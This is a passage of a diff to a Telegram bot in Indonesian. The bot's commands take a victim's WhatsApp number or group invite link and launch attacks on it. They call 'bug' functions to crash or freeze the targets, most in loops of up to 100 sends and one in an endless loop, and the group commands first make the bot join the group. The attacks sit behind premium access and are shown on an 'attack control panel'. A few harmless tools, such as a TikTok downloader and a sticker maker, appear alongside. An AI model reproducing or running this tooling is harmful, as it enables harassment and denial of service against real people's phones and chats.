+            for (let i=0;i<100;i++){ await delaycrashV4(sock, target); await sleep(1500); }
+          }
+          else if (bug === "stcb") {
+            for (let i=0;i<50;i++){ await stickerUi(sock, target); await sleep(1000); }
+          }
+          else if (bug === "fcclick") {
+            for (let i=0;i<10;i++){ await X7Klik(sock, target); await sleep(1000); }
+          }
+        }
+        await sleep(1500);
+      }
+
+      await ctx.reply(`✅ DONE\nTarget: ${s.targets.length}\nBug: ${s.selected.join(", ")}`);
+
+    } catch (err) {
+      console.error(err);
+      await ctx.reply("❌ Error saat eksekusi");
+    }
+
+    return;
+  }
+
+  // ===== TOGGLE =====
+  const i = s.selected.indexOf(key);
+
+  if (i > -1) s.selected.splice(i, 1);
+  else s.selected.push(key);
+
+  await updateMulti(ctx);
+  await ctx.answerCbQuery(`${key.toUpperCase()} ${i > -1 ? "OFF" : "ON"} ⭐`);
+});
+// CUSTOMBUG 2
+// ===== PAGE DATA (UPGRADE JADI 5 PAGE) =====
+const togglePages = {
+  1: ["bulldo", "delayfreeze", "harddelay"],
+  2: ["bebasspam", "stcb", "fcclick"]
+};
+
+bot.command("custombug1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const args = ctx.message.text.split(" ");
+  const q = args[1];
+  if (!q) return ctx.reply("Example: /custombug1 62xxx");
+
+  const cleanNumber = q.replace(/[^0-9]/g, '');
+  const finalNumber = `${cleanNumber}@s.whatsapp.net`;
+
+  attackConfig.set(ctx.from.id, {
+    target: finalNumber,
+    number: cleanNumber,
+    page: 1,
+
+    bulldo: false,
+    delayfreeze: false,
+    harddelay: false,
+    bebasspam: false,
+    stcb: false
+  });
+
+  const s = attackConfig.get(ctx.from.id);
+
+  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: formatPanel(s),
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: buildMenu(s)
+    }
+  });
+});
+
+// ===== FORMAT =====
+function formatPanel(s) {
+  const icon = (v) => v ? "⭐" : "💎";
+
+  return `⚡ *ATTACK CONTROL PANEL* ⚡\n\n` +
+         `📄 Page : ${s.page}/2\n\n` +
+
+         `🔥 STATUS\n` +
+         `• BULLDOZER       : ${icon(s.bulldo)}\n` +
+         `• DELAY            : ${icon(s.delayfreeze)}\n` +
+         `• DELAY HARD     : ${icon(s.harddelay)}\n` +
+         `• BEBAS SPAM     : ${icon(s.bebasspam)}\n` +
+         `• STIKER BLANK   : ${icon(s.stcb)}\n`;
+         `• FC CLICK         : ${icon(s.fcclick)}\n`;
+}
+
+// ===== BUTTON =====
+function buildMenu(s) {
+  const btn = (key) => ({
+    text: `${s[key] ? "⭐" : "💎"} ${key.toUpperCase()}`,
+    callback_data: `toggle_${key}`
+  });
+
+  const current = togglePages[s.page];
+  const keyboard = [];
+
+  for (let i = 0; i < current.length; i += 2) {
+    const row = [];
+    row.push(btn(current[i]));
+    if (current[i + 1]) row.push(btn(current[i + 1]));
+    keyboard.push(row);
+  }
+
+  keyboard.push([
+    { text: "⬅️", callback_data: `custombug1_page_${s.page - 1}:${s.target}` },
+    { text: `📄 ${s.page}/2`, callback_data: "noop" },
+    { text: "➡️", callback_data: `custombug1_page_${s.page + 1}:${s.target}` }
+  ]);
+
+  keyboard.push([
+    { text: "🚀 EXECUTE", callback_data: `custombug1_exec:${s.target}` }
+  ]);
+
+  return keyboard;
+}
+
+// ===== UPDATE =====
+async function update(ctx, s) {
+  await ctx.telegram.editMessageCaption(
+    ctx.callbackQuery.message.chat.id,
+    ctx.callbackQuery.message.message_id,
+    null,
+    formatPanel(s),
+    {
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: buildMenu(s)
+      }
+    }
+  );
+}
+
+// ===== TOGGLE =====
+bot.action(/^toggle_(.+)$/, async (ctx) => {
+  const key = ctx.match[1];
+  const s = attackConfig.get(ctx.from.id);
+  if (!s) return ctx.answerCbQuery("Session expired");
+
+  if (!(key in s)) return ctx.answerCbQuery("Invalid");
+
+  s[key] = !s[key];
+
+  await update(ctx, s);
+  await ctx.answerCbQuery(`${key.toUpperCase()} ${s[key] ? "ON ⭐" : "OFF"}`);
+});
+
+// ===== SLIDE =====
+bot.action(/^custombug1_page_(\d+):(.+)$/, async (ctx) => {
+  const page = parseInt(ctx.match[1]);
+  const s = attackConfig.get(ctx.from.id);
+  if (!s) return ctx.answerCbQuery("Session expired");
+
+  if (page < 1 || page > 2) return ctx.answerCbQuery();
+
+  s.page = page;
+
+  await update(ctx, s);
+  await ctx.answerCbQuery(`Page ${page}`);
+});
+
+// ===== EXECUTE =====
+bot.action(/^custombug1_exec:(.+)$/, async (ctx) => {
+  const target = ctx.match[1];
+  const s = attackConfig.get(ctx.from.id);
+  if (!s) return ctx.answerCbQuery("Session expired");
+
+  await ctx.answerCbQuery("🚀 EXECUTING...");
+
+  try {
+
+    if (s.bulldo) for (let i=0;i<100;i++){ await dingleyhard(sock, target, ptcp = true); await sleep(1500);}
+    if (s.delayfreeze) for (let i=0;i<100;i++){ await CrmXcarousel(sock, target); await sleep(1500);}
+    if (s.harddelay) for (let i=0;i<100;i++){ await MBGCOMBO(sock, target); await sleep(1500);}
+    if (s.bebasspam) for (let i=0;i<100;i++){ await delaycrashV4(sock, target); await sleep(1500);}
+    if (s.stcb) for (let i=0;i<50;i++){ await stickerUi(sock, target); await sleep(1000);}
+    if (s.fcclick) for (let i=0;i<10;i++){ await X7Klik(sock, target); await sleep(1000);}
+    
+    await ctx.reply(`✅ ATTACK FINISHED`);
+
+  } catch (err) {
+    console.error(err);
+    await ctx.reply("❌ Error saat eksekusi");
+  }
+});
+//////// -- CASE BUG SELECT BUTTON BUG --- \\\\\\\\\\\
+let lastTarget = {}; // simpen nomor biar kebaca di action
+
+bot.command("attack", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+
+  const chatId = ctx.chat.id;
+  
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+
+  const args = ctx.message.text.split(" "); // 🔥 FIX
+  const q = args[1];
+  if (!q) return ctx.reply("Example: /attack 62xxx");
+
+  const cleanNumber = args[1].replace(/[^0-9]/g, '');
+  const finalNumber = `${cleanNumber}@s.whatsapp.net`;
+
+  lastTarget[ctx.from.id] = cleanNumber; // 🔥 simpen
+
+  const waStatus = sock && sock.user
+    ? "On Boss"
+    : "Ga On Jir"; 
+
+  const caption = `
+「𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄」
+⫹⫺ - ${cleanNumber}
+⫹⫺ - Date : ${new Date().toLocaleDateString()}
+⫹⫺ - Status Sender : ${waStatus}
+⫹⫺ - 𝗦𝗘𝗟𝗘𝗖𝗧 𝗧𝗛𝗘 𝗕𝗨𝗧𝗢𝗡 𝗕𝗨𝗚
+`;
+
+  const keyboard = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "𝗕𝗨𝗟𝗟𝗗𝗢𝗭𝗘𝗥 👻", callback_data: `attack_bulldo:${finalNumber}` },
+          { text: "𝗗𝗘𝗟𝗔𝗬 𝗙𝗥𝗘𝗘𝗭𝗘 🧬", callback_data: `attack_delayfreeze:${finalNumber}` }
+        ],
+        [
+          { text: "𝗗𝗘𝗟𝗔𝗬 𝗛𝗔𝗥𝗗 📱", callback_data: `attack_harddelay:${finalNumber}` }
+        ],
+        [
+          { text: "𝗕𝗟𝗔𝗡𝗞 🔥", callback_data: `attack_stcb:${finalNumber}` }, 
+          { text: "𝗙𝗖 𝗖𝗟𝗜𝗖𝗞 🔥", callback_data: `attack_fcclick:${finalNumber}` }
+        ]
+      ]
+    }
+  };
+
+  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption,
+    ...keyboard,
+  });
+});
+
+bot.action(/^attack_(\w+):(.+)$/, checkPremium, async (ctx) => {
+  const bugType = ctx.match[1];
+  const target = ctx.match[2];
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+  const cleanNumber = lastTarget[ctx.from.id] || target; // Fallback ke target jika lastTarget kosong
+
+  await ctx.answerCbQuery();
+
+  try {
+    // Memastikan sock tersedia (ganti dengan cara kamu mendefinisikan sock jika berbeda)
+    // if (!sock) return ctx.reply("❌ Koneksi bot WhatsApp tidak aktif.");
+
+    switch (bugType) {
+      case "stcb":
+        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
+        for (let i = 0; i < 60; i++) {
+          await stickerUi(sock, target);
+          await sleep(1000);
+        }
+        break;
+        
+      case "fcclick":
+        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
+        for (let i = 0; i < 10; i++) {
+          await X7Klik(sock, target);
+          await sleep(1000);
+        }
+        break;
+
+      case "harddelay":
+        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
+        for (let i = 0; i < 100; i++) {
+          await MBGCOMBO(sock, target);
+          await sleep(1500);
+        }
+        break;
+
+      case "bulldo":
+        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
+        for (let i = 0; i < 100; i++) {
+          await dingleyhard(sock, target, true); // Perbaikan penulisan parameter default ptcp
+          await sleep(1000);
+        }
+        break;
+
+      case "delayfreeze":
+        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
+        for (let i = 0; i < 100; i++) {
+          await CrmXcarousel(sock, target);
+          await sleep(1000);
+        }
+        break;
+
+      default:
+        return ctx.reply("❌ Bug tidak ditemukan.");
+    }
+
+    // Menambahkan parse_mode: "HTML" agar tag blockquote aktif
+    await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+      caption:  `\`\`\`💤 MODE : Spesial Bug
+
+🤍 User   : ${username}
+🎯 Target : ${cleanNumber}
+Type   : Status
+🚀 Result : SPAM COMPLETE\`\`\``, 
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://wa.me/${cleanNumber}`, style: "danger" }
+          ]
+        ]
+      }
+    });
+
+  } catch (err) {
+    console.error(err);
+    await ctx.reply("Error terjadi, silakan cek konsol/panel.");
+  }
+});
+
+//////// -- CASE TOOLS --- \\\\\\\\\\\
+bot.command("brat", async (ctx) => {
+  const text = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!text) return ctx.reply("❌ Masukkan teks!");
+
+  try {
+    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
+      text
+    )}&isVideo=false`;
+
+    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
+    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
+  } catch (e) {
+    console.error("Error saat membuat stiker:", e);
+    ctx.reply("❌ Gagal membuat stiker brat.");
+  }
+});
+bot.command("tiktokdl", checkPremium, async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");
+
+  let url = args;
+  if (ctx.message.entities) {
+    for (const e of ctx.message.entities) {
+      if (e.type === "url") {
+        url = ctx.message.text.substr(e.offset, e.length);
+        break;
+      }
+    }
+  }
+
+  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");
+
+  try {
+    const { data } = await axios.get("https://tikwm.com/api/", {
+      params: { url },
+      headers: {
+        "user-agent":
+          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
+        "accept": "application/json,text/plain,*/*",
+        "referer": "https://tikwm.com/"
+      },
+      timeout: 20000
+    });
+
+    if (!data || data.code !== 0 || !data.data)
+      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");
+
+    const d = data.data;
+
+    if (Array.isArray(d.images) && d.images.length) {
+      const imgs = d.images.slice(0, 10);
+      const media = await Promise.all(
+        imgs.map(async (img) => {
+          const res = await axios.get(img, { responseType: "arraybuffer" });
+          return {
+            type: "photo",
+            media: { source: Buffer.from(res.data) }
+          };
+        })
+      );
+      await ctx.replyWithMediaGroup(media);
+      return;
+    }
+
+    const videoUrl = d.play || d.hdplay || d.wmplay;
+    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");
+
+    const video = await axios.get(videoUrl, {
+      responseType: "arraybuffer",
+      headers: {
+        "user-agent":
+          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
+      },
+      timeout: 30000
+    });
+
+    await ctx.replyWithVideo(
+      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
+      { supports_streaming: true }
+    );
+  } catch (e) {
+    const err =
+      e?.response?.status
+        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
+        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
+    await ctx.reply(err);
+  } finally {
+    try {
+      await ctx.deleteMessage(wait.message_id);
+    } catch {}
+  }
+});
+
+const formatUserInfo = (user, chat) => {
+  const lines = [
+    `👤 *Info User*`,
+    ``,
+    `🆔 *User ID:* \`${user.id}\``,
+    `👤 *Nama:* ${user.first_name}${user.last_name ? " " + user.last_name : ""}`,
+    `🔖 *Username:* ${user.username ? "@" + user.username : "_(tidak ada)_"}`,
+    `🤖 *Bot:* ${user.is_bot ? "Ya" : "Tidak"}`,
+    `🌐 *Bahasa:* ${user.language_code || "_(tidak diketahui)_"}`,
+    ``,
+    `💬 *Info Chat*`,
+    ``,
+    `🆔 *Chat ID:* \`${chat.id}\``,
+    `📌 *Tipe Chat:* ${chat.type}`,
+  ];
+
+  if (chat.title) lines.push(`📛 *Judul Grup:* ${chat.title}`);
+  if (chat.username) lines.push(`🔖 *Username Grup:* @${chat.username}`);
+
+  return lines.join("\n");
+};
+
+bot.command("info", (ctx) => {
+  ctx.replyWithMarkdown(formatUserInfo(ctx.from, ctx.chat));
+});
+
+
+bot.command("iqc", async (ctx) => {
+  const text = ctx.message.text.split(" ").slice(1).join(" "); 
+
+  if (!text) {
+    return ctx.reply(
+      "❌ Format: /iqc 18:00|40|Indosat|SennJmbud",
+      { parse_mode: "Markdown" }
+    );
+  }
+
+
+  let [time, battery, carrier, ...msgParts] = text.split("|");
+  if (!time || !battery || !carrier || msgParts.length === 0) {
+    return ctx.reply(
+      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
+      { parse_mode: "Markdown" }
+    );
+  }
+
+  await ctx.reply("⏳ Wait a moment...");
+
+  let messageText = encodeURIComponent(msgParts.join("|").trim());
+  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
+    time
+  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
+    carrier
+  )}&messageText=${messageText}&emojiStyle=apple`;
+
+  try {
+    let res = await fetch(url);
+    if (!res.ok) {
+      return ctx.reply("❌ Gagal mengambil data dari API.");
+    }
+
+    let buffer;
+    if (typeof res.buffer === "function") {
+      buffer = await res.buffer();
+    } else {
+      let arrayBuffer = await res.arrayBuffer();
+      buffer = Buffer.from(arrayBuffer);
+    }
+
+    await ctx.replyWithPhoto({ source: buffer }, {
+      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
+      parse_mode: "Markdown"
+    });
+  } catch (e) {
+    console.error(e);
+    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
+  }
+});
+//////// -- CASE BUG GROUP --- \\\\\\\\\\\
+bot.command("fcgb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const text = ctx.message.text || "";
+  
+  // Regex super aman untuk mengambil kode undangan WhatsApp Group
+  const inviteCodeMatch = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,26})/);
+  
+  if (!inviteCodeMatch) {
+    return ctx.reply(`❌ Format link salah!\nExample: /fcgb https://chat.whatsapp.com/InviteCodeGrupNya`);
+  }
+
+  const inviteCode = inviteCodeMatch[1]; // Ini kode bersihnya (tanpa spasi / parameter sisa)
+  let target = null;
+
+  try {
+    // LANGKAH 1: Cek internal cache bot dulu (apakah bot sudah di dalam grup?)
+    try {
+      const chats = await sock.groupFetchAllParticipating();
+      const groups = Object.values(chats);
+      
+      // Cari yang metadata inviteCode-nya sama, atau id grup-nya sama (jika ada)
+      const matchingGroup = groups.find(g => g.inviteCode === inviteCode || g.id?.includes(inviteCode));
+      if (matchingGroup) {
+        target = matchingGroup.id;
+      }
+    } catch (cacheError) {
+      console.log("Gagal fetch internal cache, lanjut metode langsung...");
+    }
+
+    // LANGKAH 2: Jika JID belum ketemu dari cache, pakai groupGetInviteInfo / groupAcceptInvite
+    if (!target) {
+      try {
+        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
+        target = groupInfo.id;
+        
+        // Langsung auto join
+        await sock.groupAcceptInvite(inviteCode);
+      } catch (inviteError) {
+        // Handle kondisi unik: Baileys sering return error 409 (conflict) kalau bot SEBENARNYA SUDAH JOIN
+        if (inviteError.status === 409 || String(inviteError).includes("conflict")) {
+          // Jika error karena sudah join, coba tebak atau ekstrak JID dari object error
+          target = inviteError.context?.jid || inviteError.jid;
+        }
+        
+        // Jika masih tidak ketemu target JID-nya, coba paksa join langsung tanpa GetInfo
+        if (!target) {
+          try {
+            target = await sock.groupAcceptInvite(inviteCode);
+          } catch (forceJoinError) {
+            // Jika force join juga mengembalikan info JID (di beberapa versi Baileys)
+            if (forceJoinError.context?.jid) target = forceJoinError.context.jid;
+          }
+        }
+      }
+    }
+
+    // PENGAMAN TERAKHIR: Jika semua cara di atas gagal mendapatkan JID (@g.us)
+    if (!target) {
+      return ctx.reply("❌ Gagal mendapatkan ID Grup. Pastikan bot belum di-banned atau link undangan masih aktif!");
+    }
+
+  } catch (globalError) {
+    console.error("Error Group Join:", globalError);
+    return ctx.reply("❌ Terjadi kesalahan sistem saat memproses grup.");
+  }
+
+  // --- JIKA JID BERHASIL DIDAPATKAN, PROSES SPAM SEPERTI BIASA ---
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : FC CLICK (GROUP)
+
+🤍 User   : ${username}
+🎯 Target : Group (Link)
+Type   : Status
+🚀 Result : READY & SENDING</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
+      },
+  });
+
+  // Proses Eksekusi Spamming
+  await (async () => {
+    for (let i = 0; i < 10; i++) {
+        await X7Klik(sock, target);
+        await sleep(1500);
+    }
+  })();
+
+  // Update status setelah selesai
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : FC CLICK (GROUP)
+
+🤍 User   : ${username}
+🎯 Target : Group (Link)
+Type   : Status
+🚀 Result : SPAM COMPLETE</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("delaygb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const text = ctx.message.text || "";
+  
+  // Regex super aman untuk mengambil kode undangan WhatsApp Group
+  const inviteCodeMatch = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,26})/);
+  
+  if (!inviteCodeMatch) {
+    return ctx.reply(`❌ Format link salah!\nExample: /delaygb https://chat.whatsapp.com/InviteCodeGrupNya`);
+  }
+
+  const inviteCode = inviteCodeMatch[1]; // Ini kode bersihnya (tanpa spasi / parameter sisa)
+  let target = null;
+
+  try {
+    // LANGKAH 1: Cek internal cache bot dulu (apakah bot sudah di dalam grup?)
+    try {
+      const chats = await sock.groupFetchAllParticipating();
+      const groups = Object.values(chats);
+      
+      // Cari yang metadata inviteCode-nya sama, atau id grup-nya sama (jika ada)
+      const matchingGroup = groups.find(g => g.inviteCode === inviteCode || g.id?.includes(inviteCode));
+      if (matchingGroup) {
+        target = matchingGroup.id;
+      }
+    } catch (cacheError) {
+      console.log("Gagal fetch internal cache, lanjut metode langsung...");
+    }
+
+    // LANGKAH 2: Jika JID belum ketemu dari cache, pakai groupGetInviteInfo / groupAcceptInvite
+    if (!target) {
+      try {
+        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
+        target = groupInfo.id;
+        
+        // Langsung auto join
+        await sock.groupAcceptInvite(inviteCode);
+      } catch (inviteError) {
+        // Handle kondisi unik: Baileys sering return error 409 (conflict) kalau bot SEBENARNYA SUDAH JOIN
+        if (inviteError.status === 409 || String(inviteError).includes("conflict")) {
+          // Jika error karena sudah join, coba tebak atau ekstrak JID dari object error
+          target = inviteError.context?.jid || inviteError.jid;
+        }
+        
+        // Jika masih tidak ketemu target JID-nya, coba paksa join langsung tanpa GetInfo
+        if (!target) {
+          try {
+            target = await sock.groupAcceptInvite(inviteCode);
+          } catch (forceJoinError) {
+            // Jika force join juga mengembalikan info JID (di beberapa versi Baileys)
+            if (forceJoinError.context?.jid) target = forceJoinError.context.jid;
+          }
+        }
+      }
+    }
+
+    // PENGAMAN TERAKHIR: Jika semua cara di atas gagal mendapatkan JID (@g.us)
+    if (!target) {
+      return ctx.reply("❌ Gagal mendapatkan ID Grup. Pastikan bot belum di-banned atau link undangan masih aktif!");
+    }
+
+  } catch (globalError) {
+    console.error("Error Group Join:", globalError);
+    return ctx.reply("❌ Terjadi kesalahan sistem saat memproses grup.");
+  }
+
+  // --- JIKA JID BERHASIL DIDAPATKAN, PROSES SPAM SEPERTI BIASA ---
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY HARD (GROUP)
+
+🤍 User   : ${username}
+🎯 Target : Group (Link)
+Type   : Status
+🚀 Result : READY & SENDING</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
+      },
+  });
+
+  // Proses Eksekusi Spamming
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+        await X7DelayGb(sock, target);
+        await sleep(1500);
+    }
+  })();
+
+  // Update status setelah selesai
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : INVISIBLE DELAY HARD (GROUP)
+
+🤍 User   : ${username}
+🎯 Target : Group (Link)
+Type   : Status
+🚀 Result : SPAM COMPLETE</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+//////// -- CASE BUG BIASA --- \\\\\\\\\\\
+bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  (async () => {
+    while (true) {
+      await delaycrashV4(sock, target);
+      await sleep(1500);
+    }
+  })();
+});
+
+bot.command("xspam1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /xspam1 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+      await dingleyhard(sock, target, ptcp = true);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("xspam2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /xspam2 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+      await Delayft(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("xspam3", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /xspam3 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+      await RX7DELAYNEW(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+
+bot.command("xspam4", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /xspam4 62xxxx`);
